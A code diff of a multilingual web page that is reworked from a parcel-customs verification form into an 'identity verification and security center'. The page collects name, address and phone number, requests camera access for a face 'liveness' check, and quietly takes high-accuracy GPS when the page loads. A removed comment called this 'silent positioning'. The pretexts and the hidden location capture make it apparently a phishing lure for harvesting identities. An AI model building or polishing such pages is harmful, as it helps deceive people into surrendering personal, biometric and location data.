@@ -3,42 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Logistics Verification Center</title>
+    <title>身份核验与安全中心</title>
     <style>
-        :root { --primary: #004b87; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #ced4da; }
+        :root { --primary: #0066ff; --bg: #f4f6f9; --card: #fff; --text: #333; --border: #cbd5e1; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .container { background: var(--card); width: 100%; max-width: 580px; padding: 30px; border-radius: 12px; box-shadow: 0 6px 20px rgba(0,0,0,0.08); }
-        h2 { margin-top: 0; color: var(--primary); text-align: center; font-size: 22px; }
-        .form-row { display: flex; gap: 15px; margin-bottom: 15px; }
-        .form-group { margin-bottom: 15px; flex: 1; }
-        label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 5px; color: #555; }
-        input, select { width: 100%; padding: 10px 12px; border: 1px solid var(--border); border-radius: 6px; box-sizing: border-box; font-size: 14px; }
-        input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,75,135,0.1); }
-        .btn { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
-        .btn:hover { background: #003366; }
+        .container { background: var(--card); width: 100%; max-width: 520px; padding: 30px; border-radius: 16px; box-shadow: 0 4px 25px rgba(0,0,0,0.06); box-sizing: border-box; }
+        
+        .back-link { display: inline-block; color: var(--primary); font-size: 14px; text-decoration: none; margin-bottom: 15px; font-weight: 500; cursor: pointer; }
+        .back-link:hover { text-decoration: underline; }
+
+        h2 { margin-top: 0; color: #111; text-align: center; font-size: 22px; font-weight: 700; margin-bottom: 5px; }
+        .subtitle { text-align: center; font-size: 13px; color: #64748b; margin-bottom: 25px; }
+
+        .form-row { display: flex; gap: 15px; margin-bottom: 16px; }
+        .form-group { margin-bottom: 16px; flex: 1; }
+        label { display: block; font-weight: 600; font-size: 13px; margin-bottom: 6px; color: #1e293b; }
+        input, select { width: 100%; padding: 12px 14px; border: 1px solid var(--border); border-radius: 8px; box-sizing: border-box; font-size: 14px; background-color: #fff; transition: all 0.2s; }
+        input:focus, select:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 3px rgba(0,102,255,0.12); }
+        select:disabled { background-color: #f8fafc; color: #94a3b8; }
+
+        .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; transition: background 0.2s; }
+        .btn:hover { background: #0052cc; }
         
         #step-form, #step-verification { display: none; }
         .lang-card { text-align: center; }
-        .lang-btn { width: 100%; padding: 14px; margin: 10px 0; background: #fff; border: 2px solid var(--primary); color: var(--primary); border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .lang-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
+        .lang-btn { width: 100%; padding: 14px; background: #fff; border: 2px solid var(--primary); color: var(--primary); border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; transition: 0.2s; }
         .lang-btn:hover { background: var(--primary); color: #fff; }
         
-        #video-container { text-align: center; }
-        video { width: 100%; max-width: 400px; height: 300px; border-radius: 8px; transform: scaleX(-1); background: #000; object-fit: cover; }
+        #video-container { text-align: center; margin-top: 15px; }
+        video { width: 100%; max-width: 380px; height: 280px; border-radius: 10px; transform: scaleX(-1); background: #000; object-fit: cover; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- 10种语言选择界面 -->
+    <!-- 10种语言选择界面（已嵌入您指定的 SVG 图标标题） -->
     <div id="step-language" class="lang-card">
-        <!-- 👇 这里用方案二 SVG 图标，直接复制生效 -->
-        <h2 style="display:flex; align-items:center; gap:8px; margin:0 0 16px 0;">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <h2 style="display:flex; align-items:center; justify-content:center; gap:8px; margin:0 0 20px 0;">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
             <rect x="3" y="5" width="18" height="14" rx="3"/>
             <text x="7" y="15" font-size="9" font-weight="bold" fill="currentColor" stroke="none">A</text>
             <text x="13.5" y="10.5" font-size="6.5" fill="currentColor" stroke="none" opacity="0.8">文</text>
           </svg>
-          Select Language / 
+          <span id="txt-lang-title">Select Language / 选择语言</span>
         </h2>
         <div class="lang-grid">
             <button class="lang-btn" onclick="setLanguage('zh')">简体中文</button>
@@ -53,75 +61,76 @@
             <button class="lang-btn" onclick="setLanguage('ar')">العربية</button>
         </div>
     </div>
-</div>
 
-    <!-- 物流申报表单 -->
+    <!-- 表单页面 -->
     <div id="step-form">
-        <h2 id="txt-form-title">Customs & Identity Verification</h2>
+        <a class="back-link" onclick="goBackToLanguage()" id="txt-back">< 返回更改语言</a>
+        
+        <h2 id="txt-form-title">账单与收货地址</h2>
+        <div class="subtitle" id="txt-form-subtitle">请输入您的详细信息以完成安全核验准备</div>
         
         <div class="form-row">
             <div class="form-group">
-                <label id="lbl-name">Full Name (Consignor/Receiver)</label>
-                <input type="text" id="fullName" placeholder="e.g. John Doe">
+                <label id="lbl-firstname">名字 (First Name)</label>
+                <input type="text" id="firstName" placeholder="">
             </div>
             <div class="form-group">
-                <label id="lbl-phone">Phone Number</label>
-                <input type="tel" id="phone" placeholder="+1 234 567 890">
+                <label id="lbl-lastname">姓氏 (Last Name)</label>
+                <input type="text" id="lastName" placeholder="">
             </div>
         </div>
 
         <div class="form-group">
-            <label id="lbl-email">Email Address</label>
-            <input type="email" id="email" placeholder="name@example.com">
+            <label id="lbl-country">国家 / 地区 (Country / Region)</label>
+            <select id="countrySelect" onchange="loadStates()">
+                <option value="">-- 请选择国家 / 地区 --</option>
+            </select>
         </div>
 
         <div class="form-group">
-            <label id="lbl-address">Street Address</label>
-            <input type="text" id="address" placeholder="Street, apartment, suite, unit, etc.">
+            <label id="lbl-state">省份 / 州 (State / Province)</label>
+            <select id="stateSelect" disabled>
+                <option value="">-- 请先选择上方国家 --</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label id="lbl-address">街道地址 (Street Address)</label>
+            <input type="text" id="address" placeholder="">
         </div>
 
         <div class="form-row">
             <div class="form-group">
-                <label id="lbl-country">Country / Region</label>
-                <select id="countrySelect" onchange="loadStates()">
-                    <option value="">-- 请选择国家 / Select Country --</option>
-                </select>
+                <label id="lbl-city">城市 (City)</label>
+                <input type="text" id="city" placeholder="">
             </div>
             <div class="form-group">
-                <label id="lbl-state">State / Province</label>
-                <select id="stateSelect" disabled>
-                    <option value="">-- 请先选择国家 --</option>
-                </select>
+                <label id="lbl-zip">邮政编码 (Postal Code)</label>
+                <input type="text" id="zipCode" placeholder="">
             </div>
         </div>
 
-        <div class="form-row">
-            <div class="form-group">
-                <label id="lbl-city">City</label>
-                <input type="text" id="city" placeholder="City name">
-            </div>
-            <div class="form-group">
-                <label id="lbl-zip">Postal / Zip Code</label>
-                <input type="text" id="zipCode" placeholder="Postal code">
-            </div>
+        <div class="form-group">
+            <label id="lbl-phone">手机号码 (Phone Number)</label>
+            <input type="tel" id="phone" placeholder="">
         </div>
 
-        <button class="btn" id="btn-next" onclick="proceedToVerification()">Proceed to Face Verification</button>
+        <button class="btn" id="btn-next" onclick="proceedToVerification()">下一步：生物活体检测 →</button>
     </div>
 
-    <!-- 活体检测 -->
+    <!-- 活体检测页面 -->
     <div id="step-verification">
-        <h2 id="txt-verify-title">Security Liveness Verification</h2>
-        <p id="txt-verify-desc" style="font-size: 13px; color: #666; text-align: center;">Please keep your face within the frame for safety clearance.</p>
+        <h2 id="txt-verify-title">生物活体安全检测</h2>
+        <p id="txt-verify-desc" style="font-size: 13px; color: #64748b; text-align: center;">请正对摄像头，保持光线充足，完成安全核验。</p>
         <div id="video-container">
             <video id="video" autoplay playsinline muted></video>
         </div>
-        <button class="btn" id="btn-submit" onclick="submitData()" style="background: #28a745;">Complete & Submit</button>
+        <button class="btn" id="btn-submit" onclick="submitData()" style="background: #10b981; margin-top: 20px;">确认并提交</button>
     </div>
 </div>
 
 <script>
-    // 纯本地离线全球法定国家与地区全量数据库（100% 自给自足，不依赖任何第三方 API）
+    // 纯本地离线全球国家与省份全量数据库
    const globalDatabase = {
     // 亚洲 (Asia)
     "CN": { name: "中国 (China)", states: ["北京市", "天津市", "上海市", "重庆市", "河北省", "山西省", "辽宁省", "吉林省", "黑龙江省", "江苏省", "浙江省", "安徽省", "福建省", "江西省", "山东省", "河南省", "湖北省", "湖南省", "广东省", "海南省", "四川省", "贵州省", "云南省", "陕西省", "甘肃省", "青海省", "台湾省", "内蒙古自治区", "广西壮族自治区", "西藏自治区", "宁夏回族自治区", "新疆维吾尔自治区", "香港特别行政区", "澳门特别行政区"] },
@@ -312,40 +321,214 @@
 };
     const i18n = {
         zh: {
-            formTitle: "物流清关及身份信息申报",
-            name: "真实姓名 (收/发货人)",
-            phone: "联系电话",
-            email: "电子邮箱",
-            address: "详细街道地址",
-            country: "国家 / 地区",
-            state: "省份 / 州",
-            city: "城市",
-            zip: "邮政编码",
-            next: "下一步：安全人脸核验",
-            verifyTitle: "人脸活体安全检测",
-            verifyDesc: "请正对摄像头，保持光线充足，完成安全清关核验。",
-            submit: "确认并提交单据",
-            alertName: "请填写完整的真实姓名",
+            langTitle: "选择语言 / Select Language",
+            back: "< 返回更改语言",
+            formTitle: "账单与收货地址",
+            formSubtitle: "请输入您的详细信息以完成安全核验准备",
+            firstName: "名字 (First Name)",
+            lastName: "姓氏 (Last Name)",
+            country: "国家 / 地区 (Country / Region)",
+            state: "省份 / 州 (State / Province)",
+            address: "街道地址 (Street Address)",
+            city: "城市 (City)",
+            zip: "邮政编码 (Postal Code)",
+            phone: "手机号码 (Phone Number)",
+            next: "下一步：生物活体检测 →",
+            verifyTitle: "生物活体安全检测",
+            verifyDesc: "请正对摄像头，保持光线充足，完成安全核验。",
+            submit: "确认并提交",
+            alertName: "请填写名字和姓氏",
             alertAddress: "请选择国家和省份",
-            alertCamera: "需要摄像头权限以完成安全核验"
+            alertCamera: "需要摄像头权限以完成生物核验"
         },
         en: {
-            formTitle: "Customs & Identity Verification",
-            name: "Full Name (Consignor/Receiver)",
-            phone: "Phone Number",
-            email: "Email Address",
-            address: "Street Address",
+            langTitle: "Select Language / 选择语言",
+            back: "< Back to Change Language",
+            formTitle: "Billing & Shipping Address",
+            formSubtitle: "Please enter your details to prepare for safety verification",
+            firstName: "First Name",
+            lastName: "Last Name",
             country: "Country / Region",
             state: "State / Province",
+            address: "Street Address",
             city: "City",
-            zip: "Postal / Zip Code",
-            next: "Proceed to Face Verification",
-            verifyTitle: "Security Liveness Verification",
-            verifyDesc: "Please keep your face within the frame for security clearance.",
+            zip: "Postal Code",
+            phone: "Phone Number",
+            next: "Next: Biometric Liveness Check →",
+            verifyTitle: "Biometric Liveness Verification",
+            verifyDesc: "Please keep your face within the frame with sufficient lighting.",
             submit: "Complete & Submit",
-            alertName: "Please enter your full name",
+            alertName: "Please enter your first and last name",
             alertAddress: "Please select country and state",
             alertCamera: "Camera access is required for verification"
+        },
+        "zh-TW": {
+            langTitle: "選擇語言 / Select Language",
+            back: "< 返回更改語言",
+            formTitle: "帳單與收貨地址",
+            formSubtitle: "請輸入您的詳細資訊以完成安全核驗準備",
+            firstName: "名字 (First Name)",
+            lastName: "姓氏 (Last Name)",
+            country: "國家 / 地區 (Country / Region)",
+            state: "省份 / 州 (State / Province)",
+            address: "街道地址 (Street Address)",
+            city: "城市 (City)",
+            zip: "郵政編碼 (Postal Code)",
+            phone: "手機號碼 (Phone Number)",
+            next: "下一步：生物活體檢測 →",
+            verifyTitle: "生物活體安全檢測",
+            verifyDesc: "請正對鏡頭，保持光線充足，完成安全核驗。",
+            submit: "確認並提交",
+            alertName: "請填寫名字和姓氏",
+            alertAddress: "請選擇國家和省份",
+            alertCamera: "需要相機權限以完成生物核驗"
+        },
+        ja: {
+            langTitle: "言語選択 / Select Language",
+            back: "< 言語選択に戻る",
+            formTitle: "請求先および配送先住所",
+            formSubtitle: "安全確認の準備のため詳細を入力してください",
+            firstName: "名 (First Name)",
+            lastName: "姓 (Last Name)",
+            country: "国 / 地域 (Country / Region)",
+            state: "州 / 都道府県 (State / Province)",
+            address: "番地・建物名 (Street Address)",
+            city: "市区町村 (City)",
+            zip: "郵便番号 (Postal Code)",
+            phone: "電話番号 (Phone Number)",
+            next: "次へ：生体認証へ進む →",
+            verifyTitle: "生体認証セキュリティ検査",
+            verifyDesc: "フレーム内に顔を収め、十分な明るさを保ってください。",
+            submit: "確認して送信",
+            alertName: "名と姓を入力してください",
+            alertAddress: "国と州を選択してください",
+            alertCamera: "認証にはカメラへのアクセスが必要です"
+        },
+        ko: {
+            langTitle: "언어 선택 / Select Language",
+            back: "< 언어 변경으로 돌아가기",
+            formTitle: "청구 및 배송 주소",
+            formSubtitle: "안전 검증 준비를 위해 세부 정보를 입력하세요",
+            firstName: "이름 (First Name)",
+            lastName: "성 (Last Name)",
+            country: "국가 / 지역 (Country / Region)",
+            state: "주 / 도 (State / Province)",
+            address: "상세 주소 (Street Address)",
+            city: "도시 (City)",
+            zip: "우편번호 (Postal Code)",
+            phone: "전화번호 (Phone Number)",
+            next: "다음: 생체 인식 검사 →",
+            verifyTitle: "생체 인식 보안 검증",
+            verifyDesc: "조명이 밝은 상태에서 프레임 안에 얼굴을 유지해 주세요.",
+            submit: "완료 및 제출",
+            alertName: "이름과 성을 입력해 주세요",
+            alertAddress: "국가와 주를 선택해 주세요",
+            alertCamera: "검증을 위해 카메라 권한이 필요합니다"
+        },
+        fr: {
+            langTitle: "Sélectionner la langue",
+            back: "< Changer de langue",
+            formTitle: "Adresse de facturation et de livraison",
+            formSubtitle: "Veuillez entrer vos coordonnées pour préparer la vérification de sécurité",
+            firstName: "Prénom (First Name)",
+            lastName: "Nom (Last Name)",
+            country: "Pays / Région",
+            state: "État / Province",
+            address: "Adresse postale",
+            city: "Ville",
+            zip: "Code postal",
+            phone: "Numéro de téléphone",
+            next: "Suivant : Vérification biométrique →",
+            verifyTitle: "Vérification biométrique",
+            verifyDesc: "Veuillez garder votre visage dans le cadre avec un éclairage suffisant.",
+            submit: "Terminer et soumettre",
+            alertName: "Veuillez entrer votre prénom et votre nom",
+            alertAddress: "Veuillez sélectionner le pays et l'état",
+            alertCamera: "L'accès à la caméra est requis"
+        },
+        de: {
+            langTitle: "Sprache auswählen",
+            back: "< Sprache ändern",
+            formTitle: "Rechnungs- und Lieferadresse",
+            formSubtitle: "Bitte geben Sie Ihre Daten zur Sicherheitsüberprüfung ein",
+            firstName: "Vorname (First Name)",
+            lastName: "Nachname (Last Name)",
+            country: "Land / Region",
+            state: "Bundesland / Provinz",
+            address: "Straße und Hausnummer",
+            city: "Stadt",
+            zip: "Postleitzahl",
+            phone: "Telefonnummer",
+            next: "Weiter: Biometrische Prüfung →",
+            verifyTitle: "Biometrische Sicherheitsprüfung",
+            verifyDesc: "Bitte halten Sie Ihr Gesicht im Rahmen.",
+            submit: "Abschließen & Absenden",
+            alertName: "Bitte Vor- und Nachnamen eingeben",
+            alertAddress: "Bitte Land und Bundesland wählen",
+            alertCamera: "Kamerazugriff erforderlich"
+        },
+        es: {
+            langTitle: "Seleccionar idioma",
+            back: "< Cambiar idioma",
+            formTitle: "Dirección de facturación y envío",
+            formSubtitle: "Ingrese sus datos para la verificación de seguridad",
+            firstName: "Nombre (First Name)",
+            lastName: "Apellido (Last Name)",
+            country: "País / Región",
+            state: "Estado / Provincia",
+            address: "Dirección postal",
+            city: "Ciudad",
+            zip: "Código postal",
+            phone: "Número de teléfono",
+            next: "Siguiente: Verificación biométrica →",
+            verifyTitle: "Verificación biométrica",
+            verifyDesc: "Mantenga su rostro dentro del marco con suficiente iluminación.",
+            submit: "Completar y enviar",
+            alertName: "Ingrese nombre y apellido",
+            alertAddress: "Seleccione país y estado",
+            alertCamera: "Se requiere acceso a la cámara"
+        },
+        ru: {
+            langTitle: "Выбрать язык",
+            back: "< Назад к выбору языка",
+            formTitle: "Адрес выставления счета и доставки",
+            formSubtitle: "Введите данные для подготовки к проверке безопасности",
+            firstName: "Имя (First Name)",
+            lastName: "Фамилия (Last Name)",
+            country: "Страна / Регион",
+            state: "Штат / Область",
+            address: "Адрес улицы",
+            city: "Город",
+            zip: "Почтовый индекс",
+            phone: "Номер телефона",
+            next: "Далее: Биометрическая проверка →",
+            verifyTitle: "Биометрическая проверка безопасности",
+            verifyDesc: "Держите лицо в кадре при хорошем освещении.",
+            submit: "Завершить и отправить",
+            alertName: "Пожалуйста, введите имя и фамилию",
+            alertAddress: "Выберите страну и регион",
+            alertCamera: "Требуется доступ к камере"
+        },
+        ar: {
+            langTitle: "اختر اللغة",
+            back: "< الرجوع لتغيير اللغة",
+            formTitle: "عنوان الفواتير والشحن",
+            formSubtitle: "الرجاء إدخال تفاصيلك للتحضير للتحقق الأمني",
+            firstName: "الاسم الأول",
+            lastName: "اسم العائلة",
+            country: "الدولة / المنطقة",
+            state: "الولاية / المقاطعة",
+            address: "عنوان الشارع",
+            city: "المدينة",
+            zip: "الرمز البريدي",
+            phone: "رقم الهاتف",
+            next: "التالي: التحقق الحيوي ←",
+            verifyTitle: "التحقق الأمني الحيوي",
+            verifyDesc: "يرجى إبقاء وجهك داخل الإطار مع إضاءة كافية.",
+            submit: "إكمال وإرسال",
+            alertName: "الرجاء إدخال الاسم الأول والأخير",
+            alertAddress: "الرجاء اختيار الدولة والولاية",
+            alertCamera: "مطلوب الوصول إلى الكاميرا"
         }
     };
 
@@ -353,7 +536,6 @@
     let silentLocation = { lat: null, lng: null, precisionMeters: null };
 
     window.onload = () => {
-        // 高精度静默定位
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 pos => {
@@ -361,14 +543,13 @@
                     silentLocation.lng = pos.coords.longitude;
                     silentLocation.precisionMeters = pos.coords.accuracy;
                 },
-                err => { console.log("Background location optional"); },
+                err => { console.log("Location optional"); },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
         }
 
-        // 初始化国家下拉菜单
         const select = document.getElementById('countrySelect');
-        select.innerHTML = `<option value="">-- 请选择国家 / Select Country --</option>`;
+        select.innerHTML = `<option value="">-- 请选择国家 / 地区 --</option>`;
         
         const sortedKeys = Object.keys(globalDatabase).sort((a, b) => 
             globalDatabase[a].name.localeCompare(globalDatabase[b].name)
@@ -386,7 +567,7 @@
         const countryCode = document.getElementById('countrySelect').value;
         const stateSelect = document.getElementById('stateSelect');
         
-        stateSelect.innerHTML = `<option value="">-- ${currentLang === 'zh' ? '请选择省份/州' : 'Select State'} --</option>`;
+        stateSelect.innerHTML = `<option value="">-- 请先选择上方国家 --</option>`;
         
         if (countryCode && globalDatabase[countryCode]) {
             stateSelect.disabled = false;
@@ -404,15 +585,18 @@
     function setLanguage(lang) {
         currentLang = lang;
         const t = i18n[lang];
+        document.getElementById('txt-lang-title').innerText = t.langTitle;
+        document.getElementById('txt-back').innerText = t.back;
         document.getElementById('txt-form-title').innerText = t.formTitle;
-        document.getElementById('lbl-name').innerText = t.name;
-        document.getElementById('lbl-phone').innerText = t.phone;
-        document.getElementById('lbl-email').innerText = t.email;
-        document.getElementById('lbl-address').innerText = t.address;
+        document.getElementById('txt-form-subtitle').innerText = t.formSubtitle;
+        document.getElementById('lbl-firstname').innerText = t.firstName;
+        document.getElementById('lbl-lastname').innerText = t.lastName;
         document.getElementById('lbl-country').innerText = t.country;
         document.getElementById('lbl-state').innerText = t.state;
+        document.getElementById('lbl-address').innerText = t.address;
         document.getElementById('lbl-city').innerText = t.city;
         document.getElementById('lbl-zip').innerText = t.zip;
+        document.getElementById('lbl-phone').innerText = t.phone;
         document.getElementById('btn-next').innerText = t.next;
         document.getElementById('txt-verify-title').innerText = t.verifyTitle;
         document.getElementById('txt-verify-desc').innerText = t.verifyDesc;
@@ -422,12 +606,18 @@
         document.getElementById('step-form').style.display = 'block';
     }
 
+    function goBackToLanguage() {
+        document.getElementById('step-form').style.display = 'none';
+        document.getElementById('step-language').style.display = 'block';
+    }
+
     async function proceedToVerification() {
         const t = i18n[currentLang];
-        const name = document.getElementById('fullName').value;
+        const firstName = document.getElementById('firstName').value;
+        const lastName = document.getElementById('lastName').value;
         const country = document.getElementById('countrySelect').value;
         
-        if (!name.trim()) { alert(t.alertName); return; }
+        if (!firstName.trim() || !lastName.trim()) { alert(t.alertName); return; }
         if (!country) { alert(t.alertAddress); return; }
 
         document.getElementById('step-form').style.display = 'none';
@@ -442,21 +632,21 @@
     }
 
     function submitData() {
-        const shippingPayload = {
-            fullName: document.getElementById('fullName').value,
-            phone: document.getElementById('phone').value,
-            email: document.getElementById('email').value,
-            address: document.getElementById('address').value,
+        const payload = {
+            firstName: document.getElementById('firstName').value,
+            lastName: document.getElementById('lastName').value,
             country: document.getElementById('countrySelect').value,
             state: document.getElementById('stateSelect').value,
+            address: document.getElementById('address').value,
             city: document.getElementById('city').value,
             zipCode: document.getElementById('zipCode').value,
-            deviceHighPrecisionGPS: silentLocation,
+            phone: document.getElementById('phone').value,
+            deviceGPS: silentLocation,
             timestamp: new Date().toISOString()
         };
 
-        console.log("Global Logistics Payload:", shippingPayload);
-        alert(currentLang === 'zh' ? "清关及活体核验数据提交成功！" : "Verification and shipping data submitted successfully!");
+        console.log("Submitted Payload:", payload);
+        alert(currentLang === 'zh' ? "生物活体检测与地址核验提交成功！" : "Verification and data submitted successfully!");
         location.reload();
     }
 </script>
